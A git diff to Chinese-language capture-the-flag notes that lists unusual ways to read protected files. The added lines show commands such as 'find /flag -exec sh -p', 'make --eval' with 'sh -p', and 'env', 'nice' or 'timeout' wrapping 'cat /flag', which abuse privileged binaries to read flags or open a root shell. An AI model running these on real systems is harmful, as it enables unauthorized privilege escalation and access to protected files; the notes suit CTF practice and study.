@@ -107,7 +107,7 @@ Usage: cpio [OPTION...] [destination-directory]
 ```
 
 ### 9.2 常见命令列表<br>
-**常用的获取文本的命令**<br>
+**意想不到的获取文件内容的方法**<br>
 ```
 more ： 浏览文件内容
 less ： 浏览文件内容
@@ -135,5 +135,11 @@ zip: 压缩/解压缩文件    后缀： .zip root权限zip压缩后的文件，
 tar： 压缩/解压缩文件 tar -xf flag.tar -O 可以把解压的内容输出到命令行中
 ar： 创建、修改静态库 ar -crv flag.a flag 后 使用 ar -p flag.a flag 即可打印flag内容
 cpio： 压缩/解压缩 cpio -o <~/1.txt用于创建一个压缩文件
+genisoimage： 创建ISO镜像文件 genisoimage -sort /flag
 
+env： 展示linux的环境变量，可以利用env命令的权限执行其他命令  env cat /flag
+find：可以通过find找到某文件后，执行某命令 find /flag -exec cat {} \;  或者 find /flag -exec sh -p \; 直接拿root
+make： 编译命令 make --eval='target: ; sh -p' target
+nice： 更改程序优先级 nice cat /flag
+timeout：命令程序执行多长时间 timeout 1.0s cat /flag
 ```
